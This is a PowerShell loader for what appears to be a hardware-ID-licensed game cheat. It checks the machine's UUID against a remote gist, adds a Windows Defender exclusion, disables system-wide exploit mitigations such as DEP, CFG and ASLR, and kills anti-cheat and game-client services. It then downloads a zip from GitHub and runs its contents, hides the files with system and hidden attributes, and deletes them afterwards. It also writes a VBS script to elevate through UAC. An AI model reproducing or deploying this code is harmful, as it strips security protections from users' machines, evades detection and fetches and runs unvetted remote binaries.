

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $adminRole = [Security.Principal.WindowsBuiltInRole]::Administrator
    return $currentUser.IsInRole($adminRole)
}

$VerbosePreference = 'SilentlyContinue'
$DebugPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

Clear-Host

Function pass {
    Add-MpPreference -ExclusionPath "$bin"
    Set-ProcessMitigation -System -Disable CFG, StrictCFG, SuppressExports
    Set-ProcessMitigation -System -Disable DEP, EmulateAtlThunks
    Set-ProcessMitigation -System -Disable ForceRelocateImages
    Set-ProcessMitigation -System -Disable BottomUp, HighEntropy
    Stop-Process -Name "SecurityHealthSystray-x86_64-SSE4-AVX2" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "MRT" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "cheatengine-x86_64" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "cheatengine-x86_64-SSE4-AVX2" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "Steam.exe" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "EasyAntiCheat.exe" -Force -ErrorAction SilentlyContinue
    Stop-Process -Name "EADesktop.exe" -Force -ErrorAction SilentlyContinue
    Stop-Service -Name "EasyAntiCheat" -Force -ErrorAction SilentlyContinue
    Stop-Service -Name "Steam Client Service" -Force -ErrorAction SilentlyContinue
    Stop-Service -Name "EABackgroundService" -Force -ErrorAction SilentlyContinue
    Stop-Service -Name "+" -Force -ErrorAction SilentlyContinue
    Stop-Service -Name "CEDRIVER73" -Force -ErrorAction SilentlyContinue
    Set-Service -Name "EasyAntiCheat" -StartupType Demand
    Set-Service -Name "Steam Client Service" -StartupType Demand
    Set-Service -Name "EABackgroundService" -StartupType Demand
    
    Clear-Host
    
    $client = New-Object System.Net.WebClient
    $client.DownloadFile($gh_zip, $binZip)
    if (Test-Path $binZip) {Expand-Archive -Path $binZip -DestinationPath $bin}
    Move-Item -Path "$bin\PsExec.exe" -Destination "$env:SystemDrive\"
    Copy-Item -Path $mrt_dir -Destination $bin\mrt.exe -Force
  
    Clear-Host
    
    $attributes = @(
        "$bin\wtmpd",
        "$bin\cetrainers",
        "$bin\afolder",
        "$bin\bfcwrk",
        "$env:SystemDrive\PsExec.exe",
        "$bin\mrt.exe",
        "$binZip",
        "$bin\SecurityHealthSystray-x86_64-SSE4-AVX2.exe",
        "$bin\launch-auth.bat",
        "$bin\launch-masked.bat",
        "$bin\autorun",
        "$bin\clibs64",
        "$bin\win64",
        "$bin\allochook-x86_64.dll",
        "$bin\Bytrl.sys",
        "$bin\defines.lua",
        "$bin\libipt-64.dll",
        "$bin\lua53-64.dll",
        "$bin\luaclient-x86_64.dll",
        "$bin\main.lua",
        "$bin\PsExec.exe",
        "$bin\speedhack-x86_64.dll",
        "$bin\unload.exe",
        "$bin\unload+.bat",
        "$bin\vehdebug-x86_64.dll",
        "$bin\vmdisk.img",
        "$bin\winhook-x86_64.dll",
        "$bin\gerye465ye4h4y.exe",
        "$bin\clone.exe",
        "$bin\mask.exe",
        "$bin\hide.exe"
    )
    foreach ($attribute in $attributes) {
        attrib +s +h $attribute
    }
                            
    Start-Process $bin\launch-auth.bat
    
    Clear-Host
    cleanup
    exit
}


Function fail {
    Clear-Host
    $DesktopPath = [Environment]::GetFolderPath("Desktop")
    $AuthKeyFilePath = Join-Path -Path $DesktopPath -ChildPath "Auth_Key.txt"
    $Content = @"
    
    *Send Me This Key For Authorization!*
    Discord: Bytrl
    
    $hwid
    
"@
    
    Set-Content -Path $AuthKeyFilePath -Value $Content -Force
    Clear-Host
	cleanup
    exit
}

Function cleanup {
	$attributes = @(
	"$binZip",
	"$bin\wtmpd",
	"$bin\cetrainers",
	"$bin\afolder",
	"$bin\bfcwrk",
	"$env:SystemDrive\PsExec.exe",
	"$bin\mrt.exe",
	"$bin\SecurityHealthSystray-x86_64-SSE4-AVX2.exe",
	"$bin\launch-auth.bat",
	"$bin\launch-masked.bat",
	#"$bin\autorun",
	"$bin\clibs64",
	"$bin\win64",
	"$bin\allochook-x86_64.dll",
	"$bin\defines.lua",
	"$bin\libipt-64.dll",
	"$bin\lua53-64.dll",
	"$bin\luaclient-x86_64.dll",
	"$bin\main.lua",
	"$bin\PsExec.exe",
	"$bin\speedhack-x86_64.dll",
	"$bin\unload.exe",
	"$bin\vehdebug-x86_64.dll",
	#"$bin\vmdisk.img",
	"$bin\winhook-x86_64.dll",
	"$bin\gerye465ye4h4y.exe",
	"$bin\clone.exe",
	"$bin\mask.exe",
	"$bin\hide.exe",
	"$bin\Bytrl.sys"
    )
    
	# wait till + is running
	while ((Get-Service -Name "+" -ErrorAction SilentlyContinue).Status -ne "Running") {
	Start-Sleep -Seconds 1
	}
	
	# wait till CEDRIVER73 is not running
	while ((Get-Service -Name "CEDRIVER73" -ErrorAction SilentlyContinue).Status -eq "Running") {
	Start-Sleep -Seconds 1
	}
	
    foreach ($attribute in $attributes) {
        Remove-Item -Path $attribute -Recurse -Force
    }
	
	Stop-Process -Name "unload" -Force
	Clear-Host
	exit
}

function Get-HardwareID {
    (Get-CimInstance Win32_ComputerSystemProduct).UUID
}

$dirtyCheck = fsutil dirty query $env:SystemDrive
if ($dirtyCheck -eq "Volume - $env:SystemDrive is dirty") {
    exit
}

$hwid = Get-HardwareID
$link = "https://gist.github.com/Bytrl/894a468f05f7fe7cd2616bdfe6684a3f"
$gh_zip = "https://github.com/Bytrl/zips/raw/ddab6da115a0824478fa50d151294fdb49e51aad/_bin.zip"
$bin = "$env:Temp"
$binZip = "$env:SystemDrive\Windows\Logs\dx12.zip"
$mrt_dir = "$env:SystemDrive\Windows\System32\mrt.exe"
$authFound = $false

foreach ($line in (Invoke-WebRequest -Uri $link).Content -split "`n") {
    if ($line -match $hwid) {
        $authFound = $true
        break
    }
}

if ($authFound) {
	pass
	} else {
	fail
	}

Clear-Host

:UACPrompt
$uacScriptPath = "$env:TEMP\getadmin.vbs"
echo 'Set UAC = CreateObject("Shell.Application")' | Out-File -FilePath $uacScriptPath -Encoding ASCII
echo 'UAC.ShellExecute("cmd.exe", "/c $env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe -File $MyInvocation.MyCommand.Path", "", "runas", 1)' | Out-File -FilePath $uacScriptPath -Append -Encoding ASCII
Start-Process $uacScriptPath -Wait
Remove-Item -Path $uacScriptPath -Force
exit /B
